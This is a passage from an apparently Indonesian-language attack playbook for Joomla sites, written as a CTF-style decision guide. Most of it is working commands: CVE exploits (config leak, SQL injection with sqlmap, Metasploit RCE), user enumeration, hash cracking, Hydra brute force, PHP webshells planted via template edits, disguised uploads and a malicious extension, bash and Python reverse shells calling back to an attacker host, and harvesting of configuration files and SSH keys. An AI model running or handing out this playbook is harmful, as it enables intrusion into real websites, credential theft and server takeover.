| Hash bcrypt sangat lambat di-crack | Cost factor 10, GPU lemah | Gunakan wordlist yang lebih spesifik, atau update hash langsung di DB |
| Template editor disabled | Permission file read-only | Coba method upload media/extension, atau ubah permission via shell |
| Extension upload blocked | Filter ekstensi | Gunakan ekstensi .phtml, .php5, .pht, atau zip dengan .htaccess bypass |
| Joomla dalam maintenance mode | Admin mengaktifkan maintenance | Coba login dulu, atau bypass dengan `?option=com_users&view=login` |
| API disabled di Joomla 4 | Fitur API dimatikan | Coba metode enum lain, atau cari komponen vulnerable |
| Login CAPTCHA aktif | Proteksi brute force | Gunakan OCR/bypass atau cari cara lain (misal reset password) |
| Database connection dari luar ditolak | MySQL hanya localhost | Gunakan akses shell atau SQLi untuk query DB |

---

## 📋 Bagian 11: Cheatsheet

**Variabel global:**

```bash
TARGET="http://target.com"
LHOST="<attacker-ip>"
```

### DETECTION

```bash
# Version detect (4 method)
curl -s "$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
curl -s "$TARGET/language/en-GB/en-GB.xml" | grep -oP '(?<=<version>)[^<]+'
curl -s "$TARGET/README.txt" | head -20
curl -s "$TARGET" | grep -i 'generator'

# Admin panel confirm
curl -s -o /dev/null -w "%{http_code}" "$TARGET/administrator/"

# JoomScan quick
joomscan -u $TARGET
```

### ENUMERATION

```bash
# User enum via API (Joomla 4)
curl -s "$TARGET/api/index.php/v1/users" | jq -r '.data[].attributes.username' 2>/dev/null

# User enum via login error (Dengan Token)
TOKEN=$(curl -s -c cookies.txt "$TARGET/index.php?option=com_users&view=login" | grep -oP '[a-f0-9]{32}=1' | head -1 | cut -d'=' -f1)
curl -s -b cookies.txt -c cookies.txt -d "username=admin&passwd=wrong&option=com_users&task=user.login&return=aW5kZXgucGhw&${TOKEN}=1" "$TARGET/index.php"

# Component enum from HTML
curl -s "$TARGET" | grep -oP 'com_[a-z0-9_]+' | sort -u

# API enum (Joomla 4)
curl -s "$TARGET/api/index.php/v1/config/application" | jq .
curl -s "$TARGET/api/index.php/v1/users" | jq .
```

### EXPLOITATION

```bash
# CVE-2023-23752 one-liner (dump config)
curl -s "$TARGET/api/index.php/v1/config/application" | jq .

# Hash crack
# Joomla 3+ bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Joomla 1/2 MD5+salt (Mode 3721 atau John dynamic_1034)
hashcat -m 3721 hash.txt /usr/share/wordlists/rockyou.txt
john --format=dynamic_1034 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Template RCE setup (setelah admin)
# Edit template index.php, tambahkan:
# <?php system($_GET['cmd']); ?>
# Akses: curl "$TARGET/templates/<template>/index.php?cmd=id"
```

### POST-EXPLOITATION

```bash
# Config extract
cat /var/www/html/configuration.php

# DB dump
mysqldump -u <user> -p<pass> <dbname> > /tmp/db.sql

# Hash extract dari dump
grep -A5 "INSERT INTO.*users" /tmp/db.sql | grep -oP "'password',\s*'[^']+'" | cut -d"'" -f4
```

### CVE QUICK REFERENCE TABLE

| Versi | CVE | Type | One-liner |
|---|---|---|---|
| Joomla 4.0.0-4.2.7 | CVE-2023-23752 | API Leak | `curl -s "$TARGET/api/index.php/v1/config/application"` |
| Joomla < 3.4.6 | CVE-2015-8562 | RCE | `msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS $TARGET; run"` |
| Joomla 3.7.0 | CVE-2017-8917 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)"` |
| Joomla < 3.9.4 | CVE-2019-10945 | Dir Traversal | `curl "$TARGET/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=file&path=../../../../configuration.php"` |
| Joomla 3.6.0 | CVE-2016-9086 | Info Disclosure (Admin) | `curl -s -b cookies.txt "$TARGET/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=file&path=../../../../"` |
| Joomla 3.8.0-3.9.0 | CVE-2019-7739 | SSRF | `curl -X POST "$TARGET/index.php?option=com_ajax&plugin=...&format=raw"` |
| Joomla 4.0.0-4.1.0 | CVE-2022-27917 | SQLi | `sqlmap -u "$TARGET/api/index.php/v1/..."` |
| Joomla 1.5-3.4.5 | CVE-2016-8869 | PrivEsc | Craft registration payload |
| Joomla 3.2-3.4.4 | CVE-2015-7857 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(1,concat(0x7e,database()),0)"` |
| Joomla 3.4.5 | CVE-2015-7297 | SQLi | `sqlmap -u "$TARGET/index.php?option=com_content&view=category&id=1&Itemid=1"` |

---

# 17b — Joomla Complete Attack Workflow — Interactive Decision Guide

> **Cara baca:** Setiap langkah punya ✅ OUTPUT BERHASIL dan ❌ OUTPUT GAGAL. Ikuti panah sesuai output yang kamu dapat.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
mkdir -p ~/joomla_loot/{enum,creds,files,shell}
cd ~/joomla_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI JOOMLA & DETEKSI VERSI

## ═══════════════════════════════════════

### Langkah 0.1 — Konfirmasi CMS adalah Joomla

Bash

```
# Command 1: Cek meta generator tag
curl -s "http://$TARGET" | grep -i 'generator'

# Command 2: Cek path khas Joomla
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/administrator/"

# Command 3: Cek robots.txt untuk path Joomla
curl -s "http://$TARGET/robots.txt" | grep -iE "admin|joomla|component"
```

**OUTPUT BERHASIL ✅ — Generator tag terdeteksi:**

HTML

```
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

➡️ Confirmed Joomla. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — /administrator/ accessible:**

text

```
302  (redirect ke login page)
200  (langsung muncul login form)
```

➡️ Admin panel ada. Catat URL. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Generator tag tidak ada:**

text

```
(tidak ada output / meta generator berbeda)
```

➡️ Mungkin Joomla tapi generator disembunyikan. Cek:

Bash

```
# Cek struktur direktori khas Joomla
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/components/"
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/templates/"
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/modules/"

# Cek language file (hampir pasti ada di semua Joomla)
curl -s "http://$TARGET/language/en-GB/en-GB.xml" | head -5
```

---

### Langkah 0.2 — Deteksi Versi Joomla (4 Metode Paralel)

Bash

```
# Method A: XML manifest (paling reliable)
curl -s "http://$TARGET/administrator/manifests/files/joomla.xml" \
    | grep -oP '(?<=<version>)[^<]+'

# Method B: Language file
curl -s "http://$TARGET/language/en-GB/en-GB.xml" \
    | grep -oP '(?<=<version>)[^<]+'

# Method C: README.txt
curl -s "http://$TARGET/README.txt" | head -5

# Method D: JoomScan otomatis (gabungkan semuanya)
joomscan -u "http://$TARGET" -o ~/joomla_loot/enum/joomscan_basic.txt
cat ~/joomla_loot/enum/joomscan_basic.txt
```

**OUTPUT BERHASIL ✅ — Versi terdeteksi:**

text

```
4.2.6
```

➡️ **PENTING — Decision berdasarkan versi:**

|Versi Terdeteksi|Prioritas Pertama|
|---|---|
|`4.0.0 - 4.2.7`|**→ LANGSUNG ke FASE 1A (CVE-2023-23752)**|
|`3.7.0`|**→ LANGSUNG ke FASE 1B (CVE-2017-8917 SQLi)**|
|`< 3.4.6`|**→ LANGSUNG ke FASE 1C (CVE-2015-8562 Pre-Auth RCE)**|
|`3.x lainnya`|**→ ke FASE 2 (Enumeration manual)**|
|`Tidak terdeteksi`|**→ ke FASE 2 (Enumeration manual)**|

**OUTPUT GAGAL ❌ — File tidak accessible (403/404):**

text

```
(empty / 403 Forbidden)
```

➡️ Versi disembunyikan. Jalankan JoomScan dengan flag lengkap:

Bash

```
joomscan -u "http://$TARGET" -ec -et -ep -x \
    -o ~/joomla_loot/enum/joomscan_full.txt
```

➡️ Jika JoomScan juga tidak dapat versi → lanjut ke **FASE 2**

---

## ═══════════════════════════════════════

## FASE 1A: CVE-2023-23752 — API CONFIG LEAK

## (Joomla 4.0.0 - 4.2.7)

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan DB credentials dari API endpoint tanpa autentikasi

### Langkah 1A.1 — Test API Endpoint

Bash

```
# Command 1: Quick test
curl -s "http://$TARGET/api/index.php/v1/config/application" | jq .

# Command 2: Jika jq tidak ada
curl -s "http://$TARGET/api/index.php/v1/config/application"

# Command 3: Dengan header tambahan (bypass beberapa WAF)
curl -s -H "Accept: application/vnd.api+json" \
    "http://$TARGET/api/index.php/v1/config/application" | jq .
```

**OUTPUT BERHASIL ✅ — Config bocor:**

JSON

```
{
  "data": [
    {
      "type": "application",
      "id": "configuration",
      "attributes": {
        "user": "joomla_user",
        "password": "Sup3rSecretDBpass!",
        "db": "joomla_db",
        "dbprefix": "jos_",
        "secret": "aB3dEfGhIjKlMnOpQrStUvWxYz123456"
      }
    }
  ]
}
```

➡️ **SIMPAN SEMUA FIELD INI:**

Bash

```
export DB_USER="joomla_user"
export DB_PASS="Sup3rSecretDBpass!"
export DB_NAME="joomla_db"
export DB_PREFIX="jos_"
export JOOMLA_SECRET="aB3dEfGhIjKlMnOpQrStUvWxYz123456"

echo "$DB_USER:$DB_PASS" >> ~/joomla_loot/creds/db_creds.txt
echo "DB: $DB_NAME | Prefix: $DB_PREFIX | Secret: $JOOMLA_SECRET" \
    >> ~/joomla_loot/creds/db_creds.txt
```

**Cara baca tiap field — PENTING:**

|Field|Nilai|Tindakan|
|---|---|---|
|`user` + `password`|DB credentials|Login MySQL → dump hash admin|
|`db`|Nama database|Target untuk dump|
|`dbprefix`|Prefix tabel|Gunakan di query SQL (ganti `jos_`)|
|`secret`|Session secret|Bisa forge session (Joomla < 3.4.6)|

➡️ Lanjut ke **Langkah 1A.2**

**OUTPUT GAGAL ❌ — 403 atau Unauthorized:**

JSON

```
{"errors":[{"title":"Forbidden","status":"403"}]}
```

➡️ Patch sudah diterapkan atau versi bukan 4.0.0-4.2.7. Coba:

Bash

```
# Coba dengan format parameter berbeda
curl -s "http://$TARGET/api/index.php/v1/config/application?public=true" | jq .

# Coba endpoint users
curl -s "http://$TARGET/api/index.php/v1/users" | jq .
```

➡️ Jika masih gagal → ke **FASE 2 (Enumeration)**

---

### Langkah 1A.2 — Connect ke Database & Dump Hash Admin

Bash

```
# Command 1: Jika MySQL bisa diakses remote (cek dulu)
mysql -h $TARGET -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" 2>/dev/null

# Command 2: Jika MySQL hanya localhost (biasanya ini yang terjadi di CTF)
# Harus dapat shell dulu — ke FASE 4 dengan credential reuse dulu
# Test SSH dengan DB password
ssh "$DB_USER@$TARGET"  # kadang password reuse
```

**OUTPUT BERHASIL ✅ — MySQL remote accessible:**

text

```
Welcome to the MySQL monitor. Commands end with ; or \g.
mysql>
```

➡️ Jalankan query dump admin:

SQL

```
-- Di dalam MySQL prompt:
USE joomla_db;

-- Lihat semua tabel
SHOW TABLES;

-- Dump hash admin (ganti jos_ dengan prefix yang didapat)
SELECT id, username, email, password 
FROM jos_users 
WHERE id IN (
    SELECT user_id FROM jos_user_usergroup_map 
    WHERE group_id IN (7,8)
);
```

**Output query yang dicari:**

text

```
+----+----------+-------------------+--------------------------------------------------------------+
| id | username | email             | password                                                     |
+----+----------+-------------------+--------------------------------------------------------------+
| 42 | admin    | admin@target.com  | $2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCkL2ZB2m1D3r4G5H8n6y6Z2d3 |
+----+----------+-------------------+--------------------------------------------------------------+
```

➡️ **Simpan hash:**

Bash

```
echo '$2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCkL2ZB2m1D3r4G5H8n6y6Z2d3' \
    > ~/joomla_loot/creds/admin_hash.txt
```

➡️ Lanjut ke **FASE 3 (Hash Cracking)**

**OUTPUT GAGAL ❌ — MySQL hanya localhost:**

text

```
ERROR 1130 (HY000): Host '10.10.14.5' is not allowed to connect
```

➡️ Harus masuk ke server dulu. Coba credential reuse:

Bash

```
# Test password DB ke SSH
ssh "$DB_USER@$TARGET"

# Test ke FTP
nxc ftp $TARGET -u "$DB_USER" -p "$DB_PASS"

# Test ke admin panel Joomla langsung
# Coba login /administrator/ dengan DB user/pass
# (kadang admin pakai password yang sama)
```

➡️ Jika credential reuse berhasil → ke **FASE 5 (Post-Auth)**  
➡️ Jika tidak → ke **FASE 2 (Enumeration)** cari vektor lain

---

## ═══════════════════════════════════════

## FASE 1B: CVE-2017-8917 — SQL INJECTION

## (Joomla 3.7.0 exact)

## ═══════════════════════════════════════

### Langkah 1B.1 — Konfirmasi SQLi & Dump Database

Bash

```
# Command 1: Cek apakah endpoint vulnerable
curl -s "http://$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)" \
    | grep -oP 'XPATH.*?~[^<]+'

# Command 2: SQLmap untuk dump otomatis
sqlmap -u "http://$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)" \
    --dbs \
    --batch \
    --output-dir=~/joomla_loot/enum/sqlmap/
```

**OUTPUT BERHASIL ✅ — Database terdeteksi:**

text

```
[*] joomla_db
[*] information_schema
```

➡️ Dump tabel users:

Bash

```
sqlmap -u "http://$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)" \
    -D joomla_db \
    -T jos_users \
    -C username,password \
    --dump \
    --batch
```

**OUTPUT BERHASIL ✅ — Hash terdump:**

text

```
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCkL2ZB2m1D3r4G5H8n6y6Z2d3 |
+----------+--------------------------------------------------------------+
```

➡️ Simpan hash → ke **FASE 3 (Hash Cracking)**

**OUTPUT GAGAL ❌ — Not injectable:**

text

```
[WARNING] parameter 'list[fullordering]' does not seem to be injectable
```

➡️ Versi bukan 3.7.0 exact atau sudah dipatch. Ke **FASE 2**

---

## ═══════════════════════════════════════

## FASE 1C: CVE-2015-8562 — PRE-AUTH RCE

## (Joomla < 3.4.6)

## ═══════════════════════════════════════

### Langkah 1C.1 — Exploit via Metasploit

Bash

```
# Command 1: Via Metasploit
msfconsole -q -x "
use exploit/multi/http/joomla_http_header_rce;
set RHOSTS $TARGET;
set RPORT 80;
set TARGETURI /;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD php/meterpreter/reverse_tcp;
check;
exploit
"

# Command 2: Searchsploit untuk manual exploit
searchsploit joomla 3.4
searchsploit -m 38977  # Pilih exploit yang sesuai
python2 38977.py "http://$TARGET"
```

**OUTPUT BERHASIL ✅ — check menunjukkan vulnerable:**

text

```
[+] http://10.10.11.200:80 - The target appears to be vulnerable.
```

**OUTPUT BERHASIL ✅ — Shell didapat:**

text

```
[*] Meterpreter session 1 opened
meterpreter > shell
$ whoami
www-data
```

➡️ Dapat shell! Ke **FASE 6 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — Not vulnerable:**

text

```
[-] http://10.10.11.200:80 - The target is not vulnerable.
```

➡️ Versi tidak match. Ke **FASE 2**

---

## ═══════════════════════════════════════

## FASE 2: ENUMERATION MANUAL & USER DISCOVERY

## ═══════════════════════════════════════

> **Tujuan:** Kumpulkan info sebanyak mungkin — versi, users, components, paths

### Langkah 2.1 — JoomScan Full Enumeration

Bash

```
# Full scan dengan semua flag
joomscan -u "http://$TARGET" -ec -et -ep -x \
    -o ~/joomla_loot/enum/joomscan_full.txt

cat ~/joomla_loot/enum/joomscan_full.txt
```

**OUTPUT BERHASIL ✅ — Output JoomScan:**

text

```
[+] Target: http://10.10.11.200
[+] Joomla version: 3.9.12
[++] Admin page: http://10.10.11.200/administrator/
[++] Interesting headers found:
     X-Content-Type-Options: nosniff

[+] Core Joomla Vulnerability:
    [!] CVE-2019-10945 - Directory Traversal in com_media

[+] Component Vulnerability:
    com_fabrik - CVE-2017-1000157 - SQL Injection
```

**Cara baca dan tindakan:**

|Output|Tindakan|
|---|---|
|CVE core ditemukan|Ikuti path CVE tersebut|
|Component vulnerable|`searchsploit <component_name>`|
|Admin page URL|Catat untuk brute force / login|
|Versi terdeteksi|Cek CVE table di bagian atas|

➡️ Jika ada CVE component → ke **Langkah 2.2**  
➡️ Jika tidak ada CVE → ke **Langkah 2.3 (User Enumeration)**

---

### Langkah 2.2 — Component Enumeration & Exploit

Bash

```
# Deteksi komponen dari HTML
curl -s "http://$TARGET" | grep -oP 'com_[a-z0-9_]+' | sort -u

# Fuzzing komponen
ffuf -u "http://$TARGET/components/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla-components.txt \
    -mc 200,301,302 \
    -o ~/joomla_loot/enum/components.txt

cat ~/joomla_loot/enum/components.txt

# Cari exploit untuk setiap komponen yang ditemukan
searchsploit joomla com_fabrik
searchsploit joomla com_fields
```

**OUTPUT BERHASIL ✅ — Komponen vulnerable ditemukan:**

text

```
com_fabrik       [Status: 200]
com_rsform       [Status: 200]
```

text

```
# Searchsploit output:
Joomla! Component Fabrik 3.9.11 - Remote Code Execution    | php/webapps/50974.py
```

➡️ Download dan jalankan exploit:

Bash

```
searchsploit -m 50974
python3 50974.py --target "http://$TARGET" --lhost $LHOST --lport $LPORT
```

---

### Langkah 2.3 — User Enumeration

Bash

```
# Method A: API Joomla 4 (jika Joomla 4)
curl -s "http://$TARGET/api/index.php/v1/users" | jq -r '.data[].attributes.username'

# Method B: RSS Feed author leak
curl -s "http://$TARGET/index.php?format=feed&type=rss" \
    | grep -oP '<dc:creator>[^<]+' | cut -d'>' -f2 | sort -u

# Method C: Login error discrimination (perlu CSRF token dulu)
TOKEN=$(curl -s -c /tmp/cookies.txt \
    "http://$TARGET/index.php?option=com_users&view=login" \
    | grep -oP '[a-f0-9]{32}=1' | head -1 | cut -d'=' -f1)
echo "[*] CSRF Token: $TOKEN"

# Test username valid vs tidak valid
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
    -d "username=admin&passwd=wrongpassword&option=com_users&task=user.login&return=aW5kZXgucGhw&${TOKEN}=1" \
    "http://$TARGET/index.php" | grep -iE "username|invalid|incorrect|error"

# Method D: Registration page (jika registrasi dibuka)
curl -s "http://$TARGET/index.php?option=com_users&view=registration" \
    | grep -i "username"
```

**OUTPUT BERHASIL ✅ — User terdeteksi dari RSS:**

text

```
admin
john.doe
```

**OUTPUT BERHASIL ✅ — Error message berbeda untuk user valid vs invalid:**

text

```
# User tidak ada:    "Username and password do not match"
# User ada, pass salah: "Username and password do not match"  ← kadang sama
# Atau: "This user has been blocked"  ← user ada tapi diblokir
```

➡️ Simpan username:

Bash

```
cat > ~/joomla_loot/creds/users.txt << 'EOF'
admin
john.doe
EOF
```

➡️ Lanjut ke **FASE 4 (Brute Force / Password Attack)**

---

## ═══════════════════════════════════════

## FASE 3: HASH CRACKING

## ═══════════════════════════════════════

> **Masuk sini jika punya hash dari database dump**

### Langkah 3.1 — Identifikasi Format Hash

Bash

```
# Lihat format hash
cat ~/joomla_loot/creds/admin_hash.txt
```

**OUTPUT — Joomla 3+ (bcrypt):**

text

```
$2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCkL2ZB2m1D3r4G5H8n6y6Z2d3c3a
```

**OUTPUT — Joomla 1.x/2.x (MD5+salt):**

text

```
5f4dcc3b5aa765d61d8327deb882cf99:abcdef123456
```

---

### Langkah 3.2 — Crack Hash

Bash

```
# === JOOMLA 3+ (bcrypt $2y$) ===
# Hashcat (GPU, lebih cepat)
hashcat -m 3200 ~/joomla_loot/creds/admin_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/joomla_loot/creds/cracked.txt

# John (CPU)
john --format=bcrypt \
    ~/joomla_loot/creds/admin_hash.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

# === JOOMLA 1.x/2.x (MD5+salt) ===
# Hashcat mode 3721 (md5($pass.$salt))
hashcat -m 3721 ~/joomla_loot/creds/admin_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    --force

# John format dynamic_1034
john --format=dynamic_1034 \
    ~/joomla_loot/creds/admin_hash.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅ — Hash ter-crack:**

text

```
$2y$10$e0MYz...:password123      (hashcat)
# atau
password123 ($2y$10$e0MYz...)    (john)
```

➡️ Simpan password:

Bash

```
export ADMIN_PASS="password123"
echo "admin:$ADMIN_PASS" >> ~/joomla_loot/creds/found_creds.txt
```

➡️ Lanjut ke **Langkah 3.3 — Login Admin**

**OUTPUT GAGAL ❌ — Hash tidak ter-crack:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba:

Bash

```
# Opsi 1: Wordlist lebih besar
hashcat -m 3200 ~/joomla_loot/creds/admin_hash.txt \
    /usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Opsi 2: Rules-based attack
hashcat -m 3200 ~/joomla_loot/creds/admin_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Opsi 3: Update hash langsung di database (jika punya akses MySQL)
# Generate hash baru
php -r 'echo password_hash("pwned123", PASSWORD_BCRYPT);'
# Copy output hash, lalu update DB:
mysql -h $TARGET -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" \
    -e "UPDATE ${DB_PREFIX}users SET password='\$2y\$10\$NEWHASH' WHERE username='admin';"
```

---

### Langkah 3.3 — Login ke Admin Panel

Bash

```
# Ambil CSRF token
TOKEN=$(curl -s -c /tmp/joomla_cookies.txt \
    "http://$TARGET/administrator/index.php" \
    | grep -oP '[a-f0-9]{32}=1' | head -1 | cut -d'=' -f1)

echo "[*] Token: $TOKEN"

# Login
curl -s -b /tmp/joomla_cookies.txt -c /tmp/joomla_cookies.txt \
    -d "username=admin&passwd=$ADMIN_PASS&option=com_login&task=login&return=aW5kZXgucGhw&${TOKEN}=1" \
    "http://$TARGET/administrator/index.php" \
    | grep -iE "dashboard|cpanel|logged|error"
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

HTML

```
<title>Administration - Dashboard</title>
```

➡️ **Lanjut ke FASE 5 (Admin → Shell)**

**OUTPUT GAGAL ❌ — Invalid credentials:**

HTML

```
<div class="alert alert-error">Invalid Username or Password</div>
```

➡️ Password salah atau akun diblokir. Coba:

Bash

```
# Coba dengan username lain yang ditemukan
curl -s -b /tmp/joomla_cookies.txt -c /tmp/joomla_cookies.txt \
    -d "username=john.doe&passwd=$ADMIN_PASS&option=com_login&task=login&return=aW5kZXgucGhw&${TOKEN}=1" \
    "http://$TARGET/administrator/index.php" \
    | grep -iE "dashboard|error"
```

---

## ═══════════════════════════════════════

## FASE 4: BRUTE FORCE ADMIN LOGIN

## ═══════════════════════════════════════

> **Masuk sini jika belum punya password tapi punya username list**

### Langkah 4.1 — Hydra Brute Force

Bash

```
# PERHATIAN: Joomla memiliki CSRF token, Hydra harus handle ini
# Method 1: Hydra dengan http-form-post
hydra -l admin \
    -P /usr/share/wordlists/rockyou.txt \
    $TARGET \
    http-post-form \
    "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid" \
    -t 10 \
    -w 3

# Method 2: Gunakan wordlist yang lebih kecil dan targeted dulu
# (hindari lockout)
hydra -l admin \
    -P ~/joomla_loot/creds/targeted_passwords.txt \
    $TARGET \
    http-post-form \
    "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid" \
    -t 5
```

**Buat targeted password list dulu:**

Bash

```
cat > ~/joomla_loot/creds/targeted_passwords.txt << 'EOF'
admin
password
admin123
Password1
joomla
Joomla123!
Welcome1
Summer2024!
Company2024!
EOF

# Tambahkan nama domain/hostname sebagai kandidat
echo "TARGET2024!" >> ~/joomla_loot/creds/targeted_passwords.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[80][http-post-form] host: 10.10.11.200   login: admin   password: admin123
```

➡️ Simpan dan ke **Langkah 3.3 — Login Admin**

**OUTPUT GAGAL ❌ — No valid password found:**

text

```
[ERROR] No valid passwords were found.
```

➡️ Coba dengan username lain atau wordlist lebih besar. Jika masih gagal → ke **FASE 1A/1B/1C** cari path RCE lain tanpa login

---

## ═══════════════════════════════════════

## FASE 5: ADMIN → SHELL (POST-AUTH RCE)

## ═══════════════════════════════════════

> **Masuk sini setelah berhasil login ke /administrator/**

### Langkah 5.1 — Method 1: Template Editor (Paling Reliable)

Bash

```
# Step 1: Cek template aktif
curl -s -b /tmp/joomla_cookies.txt \
    "http://$TARGET/administrator/index.php?option=com_templates&view=styles" \
    | grep -oP 'id=[0-9]+.*?title="[^"]+"' | head -5

# Step 2: Buat webshell PHP
cat > /tmp/joomla_shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
}
?>
EOF
```

**Cara edit template via GUI (paling reliable di CTF):**

text

```
1. Login ke /administrator/
2. Joomla 3: Extensions → Templates → Templates
   Joomla 4: System → Site Templates
3. Klik template aktif (protostar / cassiopeia)
4. Klik file "index.php"
5. Tambahkan di baris PERTAMA setelah <?php :
   system($_GET['cmd']);
6. Klik "Save & Close"
```

Bash

```
# Step 3: Test webshell
curl "http://$TARGET/index.php?cmd=id"
curl "http://$TARGET/templates/protostar/index.php?cmd=id"
curl "http://$TARGET/templates/cassiopeia/index.php?cmd=id"
```

**OUTPUT BERHASIL ✅ — Command execution:**

HTML

```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

➡️ Setup listener dan trigger reverse shell:

Bash

```
# Terminal 1: Setup listener
nc -lvnp $LPORT

# Terminal 2: Trigger reverse shell
curl "http://$TARGET/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# Jika bash tidak work, coba:
# Python reverse shell
curl "http://$TARGET/index.php?cmd=python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"$LHOST\",$LPORT))%3bos.dup2(s.fileno(),0)%3bos.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bsubprocess.call([\"/bin/sh\",\"-i\"])'"
```

**OUTPUT BERHASIL ✅ — Reverse shell terhubung:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49812
www-data@target:/var/www/html$
```

➡️ **Ke FASE 6 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — Template file tidak bisa diedit:**

text

```
Error: Could not save template file. File is not writable.
```

➡️ Coba Method 2

---

### Langkah 5.2 — Method 2: Media Manager Upload

Bash

```
# Buat file PHP yang disamarkan sebagai gambar
cp /tmp/joomla_shell.php /tmp/shell.php.jpg

# Upload via Media Manager
# GUI: Content → Media → Upload Files
# atau via curl:
TOKEN=$(curl -s -b /tmp/joomla_cookies.txt \
    "http://$TARGET/administrator/index.php?option=com_media" \
    | grep -oP '[a-f0-9]{32}=1' | head -1 | cut -d'=' -f1)

curl -s -b /tmp/joomla_cookies.txt \
    -F "file=@/tmp/shell.php.jpg;type=image/jpeg" \
    -F "option=com_media" \
    -F "task=file.upload" \
    -F "folder=" \
    -F "${TOKEN}=1" \
    "http://$TARGET/administrator/index.php"

# Test akses
curl "http://$TARGET/images/shell.php.jpg?cmd=id"
curl "http://$TARGET/images/shell.php?cmd=id"
```

**OUTPUT GAGAL ❌ — Extension diblokir:**

text

```
{"success":false,"message":"Invalid file extension"}
```

➡️ Coba ekstensi bypass:

Bash

```
# Ekstensi alternatif yang kadang diizinkan
for ext in phtml php5 pht php3 pHp; do
    cp /tmp/joomla_shell.php /tmp/shell.$ext
    echo "[*] Trying extension: $ext"
    # Upload dan test
done
```

➡️ Jika masih gagal → Method 3

---

### Langkah 5.3 — Method 3: Install Malicious Extension

Bash

```
# Buat ZIP extension sederhana berisi shell
mkdir -p /tmp/joomla_ext/com_shell
cat > /tmp/joomla_ext/com_shell/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat > /tmp/joomla_ext/com_shell/com_shell.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.1" method="install">
    <name>com_shell</name>
    <version>1.0</version>
    <files folder="site">
        <filename>shell.php</filename>
    </files>
</extension>
EOF

cd /tmp/joomla_ext
zip -r /tmp/malicious_extension.zip com_shell/

# Upload via Extensions → Install → Upload Package File
# GUI atau curl:
curl -s -b /tmp/joomla_cookies.txt \
    -F "install_package=@/tmp/malicious_extension.zip" \
    -F "option=com_installer" \
    -F "task=install.install" \
    "http://$TARGET/administrator/index.php"

# Akses shell setelah install
curl "http://$TARGET/components/com_shell/shell.php?cmd=id"
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini setelah dapat shell (www-data atau user lain)**

### Langkah 6.1 — Kumpulkan Credentials dari Server

Bash

```
# Step 1: Baca configuration.php (PALING PENTING)
cat /var/www/html/configuration.php

# Step 2: Cari semua file config yang ada credentials
grep -ri "password" /var/www/html/ 2>/dev/null \
    | grep -v ".js:" | grep -v ".css:" | head -30

# Step 3: Cari SSH keys
find /home /root -name "*.rsa" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null

